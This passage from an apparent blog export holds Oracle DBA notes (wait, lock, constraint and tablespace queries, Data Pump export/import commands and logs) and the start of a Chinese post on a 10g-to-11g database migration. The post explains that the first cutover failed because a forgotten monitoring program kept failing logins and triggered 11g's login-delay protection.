Waits</span></span><br><span class="line"><span class="keyword">select</span>   sql_text   </span><br><span class="line"><span class="keyword">from</span>   v$<span class="keyword">sql</span> t1, v$session t2, v$session_wait   t3  </span><br><span class="line"><span class="keyword">where</span>   <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> t1.address<span class="operator">=</span>t2.sql_address   </span><br><span class="line"><span class="keyword">and</span> t1.hash_value<span class="operator">=</span>t2.sql_hash_value</span><br><span class="line"><span class="keyword">and</span> t2.sid<span class="operator">=</span>t3.sid   </span><br><span class="line"><span class="keyword">and</span> t3.event<span class="operator">=</span><span class="string">&#x27;buffer busy waits&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><ul>
<li>TOP IO SQL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- - TOP IO SQL</span></span><br><span class="line"><span class="keyword">select</span> p.spid,s.sid,s.machine,s.program,q.disk_reads,q.sql_text</span><br><span class="line"><span class="keyword">from</span> v$process p,v$session s,v$<span class="keyword">sql</span> q</span><br><span class="line"><span class="keyword">where</span> p.addr<span class="operator">=</span>s.paddr <span class="keyword">and</span> s.sql_id<span class="operator">=</span>q.sql_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<h4 id="INDEX"><a href="#INDEX" class="headerlink" title="INDEX"></a>INDEX</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">analyze <span class="keyword">table</span> TABLENAME compute statistics;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sid,opname,target,sofar,totalwork,trunc(sofar<span class="operator">/</span>totalwork<span class="operator">*</span><span class="number">100</span>,<span class="number">2</span>)<span class="operator">||</span><span class="string">&#x27;%&#x27;</span> <span class="keyword">as</span> perwork</span><br><span class="line"><span class="keyword">from</span> v$session_longops <span class="keyword">where</span> sofar<span class="operator">!=</span>totalwork <span class="keyword">and</span> sid<span class="operator">=</span><span class="string">&#x27;1479&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 21:16 1	1479	Table Scan	SLVIEW.FLUX	6457	128417	5.02%</span></span><br><span class="line"><span class="comment">-- 1	1479	Table Scan	TEST.TABLE_A	14813	128417	11.53%</span></span><br></pre></td></tr></table></figure>
<h4 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;alter system kill session &#x27;&#x27;&#x27;</span><span class="operator">||</span><span class="string">&#x27;&#x27;</span><span class="operator">||</span>s.sid<span class="operator">||</span><span class="string">&#x27;,&#x27;</span><span class="operator">||</span>s.serial#<span class="operator">||</span><span class="string">&#x27;&#x27;&#x27;;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> v$locked_object lo,dba_objects ao,v$session s</span><br><span class="line"><span class="keyword">where</span> ao.object_id <span class="operator">=</span> lo.object_id <span class="keyword">and</span> lo.session_id <span class="operator">=</span> s.sid</span><br><span class="line"><span class="keyword">and</span> object_name <span class="operator">=</span> <span class="string">&#x27;TABLENAME&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="comment">/*+ rule */</span> s.username,decode(l.type,<span class="string">&#x27;TM&#x27;</span>,<span class="string">&#x27;TABLE LOCK&#x27;</span>,<span class="string">&#x27;TX&#x27;</span>,<span class="string">&#x27;ROW LOCK&#x27;</span>,<span class="keyword">NULL</span>) LOCK_LEVEL,</span><br><span class="line">o.owner,o.object_name,o.object_type,s.sid,s.serial#,s.terminal,s.machine,s.program,s.osuser,l.CTIME</span><br><span class="line"><span class="keyword">FROM</span> v$session s,v$lock l,dba_objects o <span class="keyword">WHERE</span> l.sid <span class="operator">=</span> s.sid <span class="keyword">AND</span> l.id1 <span class="operator">=</span> o.object_id(<span class="operator">+</span>)</span><br><span class="line"><span class="keyword">and</span> machine <span class="operator">=</span><span class="string">&#x27;HOST_NAME&#x27;</span></span><br><span class="line"><span class="keyword">and</span> owner<span class="operator">=</span><span class="string">&#x27;USER_NAME&#x27;</span>  </span><br><span class="line"><span class="keyword">and</span> object_name<span class="operator">=</span><span class="string">&#x27;TABLE_NAME&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> t2.username,  </span><br><span class="line">       t2.sid,  </span><br><span class="line">       t2.serial#,  </span><br><span class="line">       t3.object_name,  </span><br><span class="line">       t2.OSUSER,  </span><br><span class="line">       t2.MACHINE,  </span><br><span class="line">       t2.PROGRAM,  </span><br><span class="line">       t2.LOGON_TIME,  </span><br><span class="line">       t2.COMMAND,  </span><br><span class="line">       t2.LOCKWAIT,  </span><br><span class="line">       t2.SADDR,  </span><br><span class="line">       t2.PADDR,  </span><br><span class="line">       t2.TADDR,  </span><br><span class="line">       t2.SQL_ADDRESS,  </span><br><span class="line">       t1.LOCKED_MODE  </span><br><span class="line">  <span class="keyword">from</span> v$locked_object t1, v$session t2, dba_objects t3  </span><br><span class="line"><span class="keyword">where</span> t1.session_id <span class="operator">=</span> t2.sid  </span><br><span class="line">   <span class="keyword">and</span> t1.object_id <span class="operator">=</span> t3.object_id  </span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> t2.logon_time;</span><br></pre></td></tr></table></figure>
<h4 id="Constraint"><a href="#Constraint" class="headerlink" title="Constraint"></a>Constraint</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> a.constraint_name, a.table_name, b.constraint_name</span><br><span class="line"><span class="keyword">from</span> user_constraints a, user_constraints b</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">a.constraint_type <span class="operator">=</span> <span class="string">&#x27;R&#x27;</span> <span class="comment">--外键</span></span><br><span class="line"><span class="comment">--and b.constraint_type = &#x27;P&#x27; --主键</span></span><br><span class="line"><span class="keyword">and</span> a.r_constraint_name <span class="operator">=</span> b.constraint_name</span><br><span class="line"><span class="keyword">and</span> a.constraint_name <span class="keyword">like</span> <span class="string">&#x27;%KEY_NAME%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 启用外键约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name enable <span class="keyword">constraint</span> constraint_name</span><br><span class="line"><span class="comment">-- 禁用外键约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name disable <span class="keyword">constraint</span> constraint_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;alter table &#x27;</span><span class="operator">||</span>table_name<span class="operator">||</span><span class="string">&#x27; enable constraint &#x27;</span><span class="operator">||</span>constraint_name<span class="operator">||</span><span class="string">&#x27;;&#x27;</span> <span class="keyword">from</span> user_constraints <span class="keyword">where</span> constraint_type<span class="operator">=</span><span class="string">&#x27;R&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;alter table &#x27;</span><span class="operator">||</span>table_name<span class="operator">||</span><span class="string">&#x27; disable constraint &#x27;</span><span class="operator">||</span>constraint_name<span class="operator">||</span><span class="string">&#x27;;&#x27;</span> <span class="keyword">from</span> user_constraints <span class="keyword">where</span> constraint_type<span class="operator">=</span><span class="string">&#x27;R&#x27;</span> ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h2><h4 id="数据泵"><a href="#数据泵" class="headerlink" title="数据泵"></a>数据泵</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 第一步：迁移准备，默认参数</span></span><br><span class="line">select * from dba_directories;</span><br><span class="line"></span><br><span class="line">create directory dir_dp  as <span class="string">&#x27;/oradata1/backdp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 第二步:备份数据</span></span><br><span class="line">expdp <span class="string">&#x27;dbusername/******#@dbnms&#x27;</span> directory=DIR_DP dumpfile=LOG_P_20200930.dmp tables=USERLOGINFO:P_20200930 logfile=LOG_EXP_20200930.log &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 第三步：Rename历史表</span></span><br><span class="line">rename USERLOGINFO to USERLOGINFO_20200910;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 第四步：重建表数据</span></span><br><span class="line">impdp <span class="string">&#x27;dbusername/******#@dbnms&#x27;</span> directory=DIR_DP dumpfile=LOG_P_20200930.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200930.log &amp;</span><br><span class="line"></span><br><span class="line">impdp <span class="string">&#x27;dbusername/******@@dbnms&#x27;</span> directory=DIR_DP dumpfile=LOG_P_20200831.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200831.log table_exists_action=append &amp;</span><br></pre></td></tr></table></figure>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li><strong>REMAP_TABLE feature was only introduced in 11G</strong></li>
</ul>
<h3 id="Expdp"><a href="#Expdp" class="headerlink" title="Expdp"></a>Expdp</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># more LOG_EXP_20200930.log</span></span><br><span class="line">;;;</span><br><span class="line">Export: Release 10.2.0.4.0 - 64bit Production on Thursday, 10 September, 2020 23:25:16</span><br><span class="line"></span><br><span class="line">Copyright (c) 2003, 2007, Oracle.  All rights reserved.</span><br><span class="line">;;;</span><br><span class="line">Connected to: Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit Production</span><br><span class="line">With the Partitioning, OLAP, Data Mining and Real Application Testing options</span><br><span class="line">Starting <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;SYS_EXPORT_TABLE_04&quot;</span>:  dbusername/********@dbnms directory=DIR_DP dumpfile=LOG_P_20200930.dmp tables=USERLOGINFO:P_20200930 logfile=LOG_EXP_20200930.log</span><br><span class="line">Estimate <span class="keyword">in</span> progress using BLOCKS method...</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/TABLE_DATA</span><br><span class="line">Total estimation using BLOCKS method: 4.994 GB</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/TABLE</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/INDEX/INDEX</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/INDEX/STATISTICS/INDEX_STATISTICS</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/STATISTICS/TABLE_STATISTICS</span><br><span class="line">. . exported <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;USERLOGINFO&quot;</span>:<span class="string">&quot;P_20200930&quot;</span>         4.335 GB 46060706 rows</span><br><span class="line">Master table <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;SYS_EXPORT_TABLE_04&quot;</span> successfully loaded/unloaded</span><br><span class="line">******************************************************************************</span><br><span class="line">Dump file <span class="built_in">set</span> <span class="keyword">for</span> SLVIEW.SYS_EXPORT_TABLE_04 is:</span><br><span class="line">  /oradata1/backdp/LOG_P_20200930.dmp</span><br><span class="line">Job <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;SYS_EXPORT_TABLE_04&quot;</span> successfully completed at 23:47:46</span><br></pre></td></tr></table></figure>
<h3 id="Impdp"><a href="#Impdp" class="headerlink" title="Impdp"></a>Impdp</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more LOG_IMP_20200930.log</span><br><span class="line">;;;</span><br><span class="line">Import: Release 10.2.0.4.0 - 64bit Production on Friday, 11 September, 2020 0:17:07</span><br><span class="line"></span><br><span class="line">Copyright (c) 2003, 2007, Oracle.  All rights reserved.</span><br><span class="line">;;;</span><br><span class="line">Connected to: Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - 64bit Production</span><br><span class="line">With the Partitioning, OLAP, Data Mining and Real Application Testing options</span><br><span class="line">Master table <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;SYS_IMPORT_FULL_01&quot;</span> successfully loaded/unloaded</span><br><span class="line">Starting <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;SYS_IMPORT_FULL_01&quot;</span>:  dbusername/********@dbnms directory=DIR_DP dumpfile=LOG_P_20200930.dmp remap_tablespace=DATALIST:DATALOG logfile=LOG_IMP_20200930.log</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/TABLE</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/TABLE_DATA</span><br><span class="line">. . imported <span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;USERLOGINFO&quot;</span>:<span class="string">&quot;P_20200930&quot;</span>         4.335 GB 46060706 rows</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/INDEX/INDEX</span><br><span class="line">ORA-31684: Object <span class="built_in">type</span> INDEX:<span class="string">&quot;SLVIEW&quot;</span>.<span class="string">&quot;IND_USERLOGINFO_LOGTIME&quot;</span> already exists</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/INDEX/STATISTICS/INDEX_STATISTICS</span><br><span class="line">ORA-39111: Dependent object <span class="built_in">type</span> INDEX_STATISTICS skipped, base object <span class="built_in">type</span> INDEX:<span class="string">&quot;DBUSER&quot;</span>.<span class="string">&quot;IND_USERLOGINFO_LOGTIME&quot;</span> already exists</span><br><span class="line">Processing object <span class="built_in">type</span> TABLE_EXPORT/TABLE/STATISTICS/TABLE_STATISTICS</span><br></pre></td></tr></table></figure>
<h4 id="Impdp参数"><a href="#Impdp参数" class="headerlink" title="Impdp参数"></a>Impdp参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REMAP_SCHEMA=scott:system   更改owner</span><br><span class="line">TABLESPACES=example   导入表空间</span><br><span class="line">TABLE_EXISTS_ACTION   追加数据</span><br><span class="line">table_exists_action   </span><br><span class="line">&#123;</span><br><span class="line">      skip 如果已存在表，则跳过并处理下一个对象；</span><br><span class="line">      append 为表增加数据；</span><br><span class="line">      truncate 截断表，然后为其增加新数据；</span><br><span class="line">      replace 删除已存在表，重新建表并追加数据</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="迁移过程"><a href="#迁移过程" class="headerlink" title="迁移过程"></a>迁移过程</h3><h4 id="监控利用率"><a href="#监控利用率" class="headerlink" title="监控利用率"></a>监控利用率</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">SELECT a.tablespace_name <span class="string">&quot;表空间名&quot;</span>,</span><br><span class="line">round(total) <span class="string">&quot;表空间大小&quot;</span>,</span><br><span class="line">free <span class="string">&quot;表空间剩余大小&quot;</span>,</span><br><span class="line">round((total - free)) <span class="string">&quot;表空间使用大小&quot;</span>,</span><br><span class="line">round(total / (1024 * 1024 * 1024)) <span class="string">&quot;表空间大小(G)&quot;</span>,</span><br><span class="line">round(free / (1024 * 1024 * 1024)) <span class="string">&quot;表空间剩余大小(G)&quot;</span>,</span><br><span class="line">round((total - free) / (1024 * 1024 * 1024)) <span class="string">&quot;表空间使用大小(G)&quot;</span>,</span><br><span class="line">round((total - free) / total, 4) * 100 <span class="string">&quot;使用率 %&quot;</span></span><br><span class="line">FROM (SELECT tablespace_name, SUM(bytes) free</span><br><span class="line">FROM dba_free_space</span><br><span class="line">GROUP BY tablespace_name) a,</span><br><span class="line">(SELECT tablespace_name, SUM(bytes) total</span><br><span class="line">FROM dba_data_files</span><br><span class="line">GROUP BY tablespace_name) b</span><br><span class="line">WHERE a.tablespace_name = b.tablespace_name</span><br><span class="line">--and round((total - free) / total, 4) * 100 &gt; 80</span><br><span class="line">order by round((total - free) / total, 4) * 100 desc</span><br></pre></td></tr></table></figure>
<h4 id="调整表空间"><a href="#调整表空间" class="headerlink" title="调整表空间"></a>调整表空间</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ALTER TABLESPACE DATAFLUX ADD DATAFILE <span class="string">&#x27;/oradata6/dbnms/dataflux601.dbf&#x27;</span> SIZE  4096M;</span><br><span class="line"></span><br><span class="line">--1、查看表空间的名称及大小</span><br><span class="line">SELECT t.tablespace_name, round(SUM(bytes / (1024 * 1024)), 0) ts_size</span><br><span class="line">FROM dba_tablespaces t, dba_data_files d</span><br><span class="line">WHERE t.tablespace_name = d.tablespace_name</span><br><span class="line">GROUP BY t.tablespace_name;</span><br><span class="line">--2、查看表空间物理文件的名称及大小</span><br><span class="line">SELECT tablespace_name,</span><br><span class="line">file_id,</span><br><span class="line">file_name,</span><br><span class="line">round(bytes / (1024 * 1024), 0) total_space</span><br><span class="line">FROM dba_data_files</span><br><span class="line"><span class="built_in">where</span>  tablespace_name=<span class="string">&#x27;DATACFG&#x27;</span></span><br><span class="line">ORDER BY tablespace_name;</span><br><span class="line"></span><br><span class="line">select * from dba_data_files;</span><br><span class="line"></span><br><span class="line">--3、查看回滚段名称及大小</span><br><span class="line">SELECT segment_name,</span><br><span class="line">tablespace_name,</span><br><span class="line">r.status,</span><br><span class="line">(initial_extent / 1024) initialextent,</span><br><span class="line">(next_extent / 1024) nextextent,</span><br><span class="line">max_extents,</span><br><span class="line">v.curext curextent</span><br><span class="line">FROM dba_rollback_segs r, v<span class="variable">$rollstat</span> v</span><br><span class="line">WHERE r.segment_id = v.usn(+)</span><br><span class="line">ORDER BY segment_name;</span><br><span class="line">--4、查看控制文件</span><br><span class="line">SELECT NAME FROM v<span class="variable">$controlfile</span>;</span><br><span class="line">--5、查看日志文件</span><br><span class="line">SELECT MEMBER FROM v<span class="variable">$logfile</span>;</span><br><span class="line">--6、查看表空间的使用情况</span><br><span class="line">SELECT SUM(bytes) / (1024 * 1024) AS free_space, tablespace_name</span><br><span class="line">FROM dba_free_space</span><br><span class="line">GROUP BY tablespace_name;</span><br><span class="line">SELECT a.tablespace_name,</span><br><span class="line">a.bytes total,</span><br><span class="line">b.bytes used,</span><br><span class="line">c.bytes free,</span><br><span class="line">(b.bytes * 100) / a.bytes <span class="string">&quot;% USED &quot;</span>,</span><br><span class="line">(c.bytes * 100) / a.bytes <span class="string">&quot;% FREE &quot;</span></span><br><span class="line">FROM sys.sm<span class="variable">$ts_avail</span> a, sys.sm<span class="variable">$ts_used</span> b, sys.sm<span class="variable">$ts_free</span> c</span><br><span class="line">WHERE a.tablespace_name = b.tablespace_name</span><br><span class="line">AND a.tablespace_name = c.tablespace_name;</span><br><span class="line">--7、查看数据库库对象</span><br><span class="line">SELECT owner, object_type, status, COUNT(*) count<span class="comment">#</span></span><br><span class="line">FROM all_objects</span><br><span class="line">GROUP BY owner, object_type, status;</span><br><span class="line">--8、查看数据库的版本　</span><br><span class="line">SELECT version</span><br><span class="line">FROM product_component_version</span><br><span class="line">WHERE substr(product, 1, 6) = <span class="string">&#x27;Oracle&#x27;</span>;</span><br><span class="line">--9、查看数据库的创建日期和归档方式</span><br><span class="line">SELECT created, log_mode, log_mode FROM v<span class="variable">$database</span>;</span><br></pre></td></tr></table></figure>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://docs.oracle.com/cd/B19306_01/server.102/b14237/initparams.htm#REFRN001">Oracle initparams</a></li>
<li><a href="https://docs.oracle.com/en/middleware/goldengate/index.html">Oracle GoldenGate Doc</a></li>
<li><a href="https://www.oracle.com/technetwork/cn/community/developer-day/3-goldengate-289794-zhs.pdf">Oracle GoldenGate 产品介绍</a></li>
<li><a href="https://docs.oracle.com/goldengate/c1230/gg-winux/GGSAU/GGSAU.pdf">Using Oracle GoldenGate Microservices Architecture</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle 数据库迁移与割接实践</title>
    <url>/2016/06/12/Technology-Oracle/</url>
    <content><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><ul>
<li>一、项目背景</li>
<li>二、主要困难</li>
<li>三、迁移前准备</li>
<li>四、失败的体验：没有一帆风顺</li>
<li>五、总结<span id="more"></span>
</li>
</ul>
<h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>某企业支撑系统，已经连续服务七年有余。算起来比我的工作年限还要长。</p>
<p>历年工程中，硬件、软件、运营团队都更新换了好几茬，单独系统核心数据库—— 一台小型机搭载Oracle 10g，附加一套磁盘阵列，从来没有动过。</p>
<p>随着近年的业务暴涨、负载上升、硬件老化，服务器、磁盘都时有故障发生，负载水平线逼近极限，故障率还有加速抬头的趋势。整个运营团队面临了巨大的客户压力，提升系统稳定性的巨大挑战摆在了大家面前。</p>
<!--![迁移拓扑](http://riboseyim-qiniu.riboseyim.com/oracle-trans-go.png)-->
<h2 id="二、主要困难"><a href="#二、主要困难" class="headerlink" title="二、主要困难"></a>二、主要困难</h2><blockquote>
<p>在“天塌地陷”的不利局面中加入进来。</p>
</blockquote>
<h4 id="2-1-困难1-团队大动荡"><a href="#2-1-困难1-团队大动荡" class="headerlink" title="2.1 困难1: 团队大动荡"></a>2.1 困难1: 团队大动荡</h4><p>原运营团队，包括但不限于资深项目经理、技术负责人、多名工程师等，先后因各种原因，在很短的时间内集中离职了。在接手之前，对于该项目我一无所知，接手以后短暂的交接过程中，也很难获取多少有价值的信息。</p>
<p>连续发生突发重大故障，我们面临巨大的商务压力，团队内部疲惫不堪、心理压力极大、士气低落。每一次大故障，所有人都得没日没夜地处理，处理好以后还得写材料汇报，汇报之后也未必能得到客户的首肯。甚至在某种程度上说，急剧增长的故障率进一步刺激、增加了离职率。正如一位哲人说的：</p>
<blockquote>
<p>降低故障率是提升团队幸福指数的首要保障。— 弗拉基米.耶维奇.严</p>
</blockquote>
<h4 id="2-2-困难2-拓扑大调整"><a href="#2-2-困难2-拓扑大调整" class="headerlink" title="2.2 困难2: 拓扑大调整"></a>2.2 困难2: 拓扑大调整</h4><p>系统的拓扑结构最初是星型：以数据库和应用服务器为核心，外挂近100台服务器。数据库服务器配置双网卡，连通内网、外网。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/oracle-trans-t1.png" alt="迁移前"></p>
<p>虽然星型结构简单易用，却也存在较大的安全隐患。在早期建设的时候，规范尚未健全，还可以用业务优先的理由搪塞过去。在本期工程中，非常明确必须要完成内外网分离的改造。</p>
<!--![迁移后](http://riboseyim-qiniu.riboseyim.com/oracle-trans-t2.png)-->
<h4 id="2-3-困难3-安全一票否决"><a href="#2-3-困难3-安全一票否决" class="headerlink" title="2.3 困难3: 安全一票否决"></a>2.3 困难3: 安全一票否决</h4><p>Oracle 版本由10g 升级到 11g，集中管理访问权限。<br>最大限度地提高安全性，口令60天更换一次，不能因为更换口令中断业务；如果出现连续的错误口令访问，甚至不惜锁定数据库。</p>
<p>从正向的角度看，这些严格规定可以倒逼改造。在软件架构规范化不足、自动化严重不足的条件下，整个迁移期间，这个问题确实给我们造成了极大困扰。</p>
<h2 id="三、迁移前准备"><a href="#三、迁移前准备" class="headerlink" title="三、迁移前准备"></a>三、迁移前准备</h2><p>基于上述三大问题，在正式迁移之前主要做了下列几项工作：</p>
<ul>
<li><p>3.1 加强监控手段，降低日常故障率；<br>  梳理需要监控的基础指标和业务指标，侧重关键业务可用性。例如，某业务的正常调度周期是3小时，部署模拟脚本，将模拟脚本的调度频率提高到5分钟一次甚至更高，通过高密度的执行，主动触发风险点，一些隐藏的问题就比较容易暴露出来。</p>
</li>
<li><p>3.2 重点培训新人，稳定队伍；<br>  本质上说，这次迁移工作的首要任务不在技术、也不在数据，而在于人。<br>  上一个团队整体流失，新补充的人员又完全没有相关经验，可以说是从0开始。基于该阶段的特殊情况，我选择了实质性暂停迁移工作，而把主要的精力投入到人员培训和组织重建上来。</p>
<p>  关于这块内容比较复杂，实际是另外一个主题，计划后续再发布，敬请关注。</p>
</li>
<li><p>3.3 梳理全局视图，调研周边系统关系链；<br>全局视图实际上也包括技术和人两个维度：</p>
<p>  1）重绘系统架构图：可以参考现有文档资料，但是主要应该立足于自主调研。绘制的过程，即是收集、整理的过程，也是制定迁移方案的思考过程。唯有自己动手，才能加深认识，做到胸有成竹。</p>
<p>  2）大量接触相关方面的领导、配合部门以及第三方厂家：<br>  个人工作经历方面，独立工作的场景居多，自己能直接控制的情况居多，不太需要理会复杂的部门关系、人际关系。这项工作对于某些人来说比较容易，但是对我而言，其实是有过一段比较困难的过程。</p>
</li>
<li><p>3.4 数据复制<br>主要实现：OGG + dblink+ 自主迁移程序。</p>
</li>
</ul>
<p><strong>OGG</strong>：即Oracle Golden Gate方案。<br>在最早的方案中，我们打算完全依赖OGG来实现数据复制，但是在实验阶段发现，该方案有其限制条件。<br>第一、历史遗留系统有庞大的历史数据，如果都用OGG，无法确保新库的及时性、一致性。<br>第二、由于管理的不规范，存在很多该做分区而没有做分区的大表，而且这样的表，数量很多，一时还真的很难分离出来。</p>
<p><strong>DB Link</strong>: 提供了旧－&gt;新库之间的快速连接通道。</p>
<p><strong>自主迁移程序</strong>：针对特殊大分区表。<br>例如A表是大量的原始数据，每天一个分区，每个分区约为4000万条记录，一个月就有1.2亿条。由于业务上非常重要，该表的数据必须迁移到新库。针对这个问题，我们自己编写了迁移脚本。按照“少量、多批次、并行”的原则，实现数据推送。</p>
<p>首先，控制每个批次提交的记录数，将每个分区4000万的数据，切分成10万一份的小切片，这样即使失败也能快速重试，还能杜绝UNDO表空间暴涨（例如exp/imp整个分区的方式）。</p>
<p>基于小粒度的切片，进一步就可以实现多批次、多进程的并行推送，从而保证每个commit和时间单元的推送规模都完全可控、可视。</p>
<ul>
<li>3.5 双库并行部署<br>在所有采集服务器开启两个入库进程，即一份原始结果同时入两套数据库。最大限度在没有额外测试系统的条件下，利用现有资源，模拟仿真正式生产环境的并发压力，同时完成负载均衡、单点故障验证测试。</li>
</ul>
<p>并不是所有的程序都能轻易的实现双库并行，有的可能只要稍微调整配置文件，有些可能就必须修改代码，还有的可能就没法弄。从这个角度观察，第一种应该就是好的代码，灵活，适应各种可能的场景。后者则可能连配置－代码分离都没有做到，侵入式编程等。</p>
<ul>
<li><p>3.6 转发入库组件开发<br>开发这个东西的时候，我一度准备中途放弃。<br>前两版发布测试的时候，起初都还不错，但是运行一段时间之后，就暴露出严重的性能问题，几乎不可用。多次调试都找不到原因。后来发现，最大的Bug不过是一个空指针异常的捕获不合理。<br>  很不经意地修改几个字符之后，一切都顺畅起来，往后再也没有出一丁点问题。<br>  很多时候可能就是这样，需要一点灵性，需要一点运气。</p>
</li>
<li><p>3.7 割接工具开发<br>系统配置收集器（例如口令配置必须保证强一致性）；<br>转发路径监视（ 外网跳板到内网跳板、跳板到数据库等）；<br>预配置／检查工具；<br>连接 切换 &amp; 回退 工具；</p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/oracle-trans-cflow-1.png" alt="割接流程"></p>
<h2 id="四、失败的体验：没有一帆风顺"><a href="#四、失败的体验：没有一帆风顺" class="headerlink" title="四、失败的体验：没有一帆风顺"></a>四、失败的体验：没有一帆风顺</h2><blockquote>
<p>第一次割接失败了！</p>
</blockquote>
<p><strong>失败的体验</strong></p>
<p>第一次割接之后，系统各项功能正如我们预计的那样顺利运行。<br>就在我们准备庆祝成功的时候，几项关键业务的吞吐量却急剧下降。初步判断是性能问题，因为每次连接时延飙升了100多倍，高达秒级，基本是不可用的。</p>
<p>人工排查几次以后，看到了大量的挂起进程，一堆的锁表。而且失败来源遍布一多半的服务器。虽然不想承认，但是我们不得不做出回退的决定。</p>
<p><strong>万事留后路</strong><br>割接失败是需要承担很大压力的。<br>这次割接是大家都期待很久的，为了几分钟的操作，用户和我们整个团队都付出了很大的努力，调动了方方面面的资源参与进来。</p>
<p>如果说有什么能稍感欣慰的话，那就是我们遍历了各种可能，几乎成功，在不可知的情况出现之后，还能赶在割接窗口结束之前，快速回退。这主要得益于前期准备方案时，特别考虑了最坏的情况，认真演练了回退流程。</p>
<p>这种体验与技术关系不大，来自于勇气——无论是正确的，还是错误的决定。</p>
<p><strong>幽灵进程</strong><br>事后筛查发现，导致割接失败的是一个监测程序——不在生产程序清单里面，没有读统一配置，自带定时调度，零散分布在一半的机器上，早已经被人遗忘。在旧库中，这个问题其实一直存在，但是不会有什么问题。</p>
<p>新数据库的版本是Oracle 11g 。<br>为了提高安全性，防止暴力破解数据库中用户的密码，Oracle默认提供了一种机制：<strong>延长失败尝试响应</strong>。<br>这种策略是：在连续使用错误密码反复尝试登录时，从第四次错误尝试开始，每次增加1秒的延迟，最长延迟目前是10秒。使用这种手段可以相对比较有效的防治用户密码的暴力破解。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/oracle-trans-test1.png" alt="01"><br><img src="http://riboseyim-qiniu.riboseyim.com/oracle-trans-test2.png" alt="02"><br><img src="http://riboseyim-qiniu.riboseyim.com/oracle-trans-test3.png" alt="03"></p>
<p>由于系统服务器较多，历史遗留程序瞬间就触发该机制，导致所有应用不可用。</p>
<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>虽然这次的迁移不甚完美，事情本身也谈不上宏大，简短的一篇更不可能穷举所有的问题和细节，但是有几点思考还是想和大家交流：</p>
<ul>
<li><p>5.1 变通</p>
